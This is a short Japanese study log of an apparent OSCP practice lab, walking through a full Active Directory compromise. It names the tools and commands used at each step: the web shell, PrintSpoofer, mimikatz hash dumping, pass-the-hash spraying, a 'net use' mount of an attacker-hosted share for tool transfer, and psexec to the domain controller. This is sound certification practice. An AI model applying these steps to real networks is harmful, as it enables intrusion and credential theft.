# AD in OSCP A
## Time
iniaccess = 3H 16min
foothold = 3H 23min
privesc = 3H 20min
abusing DC = 3H

※iniaccessはdiscordヒントあり。exploitコードのデバッグは自分でできたのでおｋ
※その他は全部Discordめっちゃみた。歯が立たへん。頑張るしか。

## 教訓
- 全ポート、特に80系はブラウザからアクセスして確認すること(nmapにサービスのらないものがあるので)
- crackmapexecは-HでNTLMを指定してパスワードスプレーできるので、横展開とかで使うべき。
- ファイルアップロードとかでうまくいかないときはrevertもバンバンした方が良い。
- Windows都のファイルアップロード等のファイル共有はimpacket-smbserver.py一択。
- ポートフォワーディングはligolo-ngが神。
- crackmapexecもPass the Hashいける。

## 手順
1. rustscanでポートのチェックから。22, 80, 81, 135, 139, 445, 3306, 3307とかが空ている。
2. とりあえず135のrpc匿名ログインからチェック。rpcclient -U "" -N 192.168.174.66かます。ディナイされる。
3. 139と445もあるのでSMBの匿名ログオンチェック。smbclient --no-pass -L <IP>。ディナイされる。
4. port 80でWebの手動チェック。その間にffufしておく。scriptが見つかったりユーザ名のリスト作ったりできた。crackmapexec等も試すがDCと通信できないのでここからiniaccessにつなげられず。
5. 80ポートでつまっていたのでDiscordでヒント見る。81ポートをブラウザでチェックしろと言われた。確かに。81の存在を忘れてた。チェックしてみる。
6. あやしげなサイト発見。ffufして怪しいディレクトリや認証情報とかも見つかるものの、認証情報はここでは使えず。
7. でぃぐってpublic exploitを見つけてくる。使ってみたが上手く動かず。pythonのコードチェックして、わんちゃんパスが悪そうだったのでいじくってみたら動いた。ここでiniaccessをウェブシェル経由で取得。ちなみにiniaccessからfootholdにちゃんともっていくのがめちゃくちゃ大変。NW遅すぎてPHPのファイルやバイナリのアップロードに苦戦。なんかうまくいかないときはrevertした方が良い。
===
権限昇格&横展開
8. とりま迷う。whoami /privしたらSeInpersonateがenabledになってる。でぃぐる。win10の特定バージョン以上だとpotatoが使えないぽいが、printerSpooferでいける。ファイルアップロードしてコマンド打てば簡単に権限昇格。ちなみにファイルアップロードはsmbserverをkali側で立ててから、net use Z:\\<attacker IP>\shareでやるといい。
9. NT Authority権限はとれてるので、sharphoundとかmimikatzを実行していく。mimikatzがGood。
10. mimikatzで複数のユーザのNTLMハッシュをゲット。ユーザ名のリストをPowerViewの力でドメイン内から探索。ユーザ名のリストも作成。
11. crackmapexecでPass the Hashを使ってパスワードスプレーする。ターゲットはms02のやつ。一人刺さるので認証情報OK
12. ここでSMBにアクセスすると思いきや、ちゃんとnmapの結果を見よう。evil-winrmでNTLMを使ってms02に入る。
13. 手動で適当にみていくと、Windows.backupてきなフォルダがあるのでそこからSAMとSYSTEMを取ってくる。
14. evil-winrmはdownloadを使ってローカルにファイルをもってこれるので便利。
15. impacket-secretsdump.pyを使ってSAMとSYSTEMから過去のNTLMを復元する。DC管理者のNTLMをゲット。
16. DC管理者はsharphoundでわかってたので、kaliからNTLMを使ってimpacket-psexec.pyを使ってDCにアクセス。おわり。

## 総括
- むずすぎた。ADやりこむしか。
- ほんまむずかった。